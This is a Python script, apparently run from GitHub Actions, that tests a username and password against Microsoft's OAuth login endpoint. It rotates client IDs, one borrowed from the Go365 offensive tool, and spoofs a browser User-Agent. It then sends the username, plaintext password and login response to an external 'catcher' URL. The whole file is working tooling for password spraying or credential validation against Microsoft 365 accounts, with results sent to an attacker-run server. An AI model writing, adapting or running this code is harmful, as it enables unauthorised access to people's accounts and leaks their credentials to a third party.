import requests, random
import os
from urllib3.exceptions import InsecureRequestWarning

required_env_vars = {"USERNAME", "PASSWORD", "CATCHERURL", "CATCHERTLS"}
env_vars = {var: os.getenv(var) for var in required_env_vars}

missing_env_vars = [var for var, value in env_vars.items() if value is None]
if missing_env_vars:
    missing_vars_str = ", ".join(missing_env_vars)
    raise ValueError(f"Missing environment variables: {missing_vars_str}")

username = env_vars["USERNAME"]
password = env_vars["PASSWORD"]
catcher_URL = env_vars["CATCHERURL"]
catcher_uses_TLS = env_vars["CATCHERTLS"].lower() == "true"



client_ids = [
        "4345a7b9-9a63-4910-a426-35363201d503", # alternate client_id taken from Optiv's Go365
        "1b730954-1685-4b74-9bfd-dac224a7b894",
        "0a7bdc5c-7b57-40be-9939-d4c5fc7cd417",
        "1950a258-227b-4e31-a9cf-717495945fc2",
        "00000002-0000-0000-c000-000000000000",
        "872cd9fa-d31f-45e0-9eab-6e460a02d1f1",
        "30cad7ca-797c-4dba-81f6-8b01f6371013"
    ]

client_id = random.choice(client_ids)

def send_login_request():
    url = "https://login.microsoft.com/common/oauth2/token"
    body_params = {
        "resource": "https://graph.windows.net",
        "client_id": client_id,
        "client_info": "1",
        "grant_type": "password",
        "username": username,
        "password": password,
        "scope": "openid",
    }
    post_headers = {
        "Accept": "application/json",
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36.",
    }

    try:
        response = requests.post(
            url,
            headers=post_headers,
            data=body_params,
            timeout=5,
        )
        return response.status_code, response.text
    
    except requests.exceptions.Timeout:
        return None, "Timeout occurred"
    except requests.exceptions.ConnectionError:
        return None, "Connection error"
    except requests.RequestException:
        return None, "Seeing something I don't understand"


def send_data_to_catcher(data, use_ssl):
    if not use_ssl:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    try:
        response = requests.post(catcher_URL, json=data, timeout=3, verify=use_ssl)
        print(f"[+] Data sent to the catcher. Status Code: {response.status_code}")
    except requests.RequestException:
        print(f"[-] Failed to send data to the catcher. Status Code: {response.status_code}")


login_response_code, login_response = send_login_request()


data = {
    "username": username,
    "password": password,
}

if login_response_code is not None and login_response is not None:
    data["status_code"] = login_response_code
    data["response"] = login_response
else:
    data["status_code"] = 500
    data["response"] = "Github actions workflow failed to perform login request"

send_data_to_catcher(data, use_ssl=catcher_uses_TLS)